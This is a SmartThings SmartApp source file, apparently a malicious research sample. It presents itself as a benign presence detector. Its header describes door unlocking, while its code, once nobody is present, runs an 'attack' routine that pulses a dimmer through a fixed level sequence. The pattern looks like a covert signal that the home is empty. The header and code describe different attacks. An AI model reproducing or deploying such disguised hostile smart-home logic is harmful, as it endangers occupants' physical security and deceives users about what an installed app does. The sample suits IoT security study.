
/**

 *  shiqiPresenceSensor

 *

 *  Copyright 2016 Yunhan Jia &amp; Shiqi Wang

 *

 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except

 *  in compliance with the License. You may obtain a copy of the License at:

 *

 *      http://www.apache.org/licenses/LICENSE-2.0

 *

 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed

 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License

 *  for the specific language governing permissions and limitations under the License.
 
 * Attack Description:
    The misuse of the benign smartApp logic would also cause some potential dangers. Undesired unlocking is a pretty typical one among these attacks.



Malicous PresensorController:
    Normal functions:
    The existence of presenceSensor could automatically unlock the door. If the user get away for ten minutes, then it would lock the door. While the user comes back, it would control the door to open automatically.

    Malicious functions:
    The malicious smartApp has such a vulnerabilities. If the range of the presenceSensor is wide enough, then there would lead to the result that not only the targeted door has been opened. The other door that has detected the existence of the presenceSensor would be unlocked which is agianst the user’s will and lead to great danger.



 */

definition(

    name: "shiqiPresenceSensor",

    namespace: "wsq",

    author: "Yunhan Jia & Shiqi Wang",

    description: "Detected the presence of the users",

    category: "Safety & Security",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",

    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

 

 

preferences {

       section("When all of these people leave home") {

        input "people", "capability.presenceSensor", multiple:true

        input "myswitch", "capability.switchLevel", title:"switchlevel?"

       // input "thelock", "capability.lock"

    }

  

    /*

    section("Change to this mode") {

        input "newMode", "mode", title: "Mode?"

    }

    section("False alarm threshold (defaults to 10 min)") {

        input "falseAlarmThreshold", "decimal", title: "Number of minutes", required: false

    }

    section( "Notifications" ) {

        input("recipients", "contact", title: "Send notifications to", required: false) {

            input "sendPushMessage", "enum", title: "Send a push notification?", options: ["Yes", "No"], required: false

            input "phone", "phone", title: "Send a Text Message?", required: false

        }

    }

    */

}

 

def installed() {

       log.debug "Installed with settings: ${settings}"

 

       initialize()

}

 

def updated() {

       log.debug "Updated with settings: ${settings}"

 

       unsubscribe()

       initialize()

}

 

def initialize() {

       //log.debug "Current mode = ${location.mode}, people = ${people.collect{it.label + ': ' + it.currentPresence}}"

    subscribe(people, "presence", presence)

    try{

           //attack()

    }

    catch(e) {

          log.debug e

    }

}

 

def presence(evt) {

    log.debug "evt.name: $evt.value"

    if (evt.value != "not present") {  

        log.debug "home"

        myswitch.setLevel(80)

        state.home = true

        state.attack = false

    }

    else {

        log.debug "not home"

        state.home = false

        state.attack = true

        myswitch.setLevel(0)

        attack()

         //runIn(0.1 * 60, attack, [overwrite: false])

    }

 

}

 

def attack() {

       log.debug "attack: no one in home!!!"

    //changeIntensity()

    try{

          runIn(60*0.1,changeIntensity,[overwrite: false])

    }

    catch(e) {

          log.debug e

    }

}

 

def changeIntensity() {

       def value = myswitch.currentState("level").value.toInteger()

    log.debug "value:$value"   

    if(state.attack) {

        if(value == 0) {

            myswitch.setLevel(20)

        }

        if(value == 20) {

            myswitch.setLevel(40)

        }

        if(value == 40) {

            myswitch.setLevel(30)

        }

        if(value == 30) {

            myswitch.setLevel(70)

        }

        if(value == 70) {

            myswitch.setLevel(50)

        }

        if(value == 50) {

            myswitch.setLevel(0)

            state.attack = false

        }

        runIn(0.1*60,changeIntensity,[overwrite: false])

    }

    else {

          if(state.home) {

             myswitch.setLevel(80)

        }

        else {

             myswitch.setLevel(0)

            log.debug "attackSending succeeded"

        }

         

    }

}

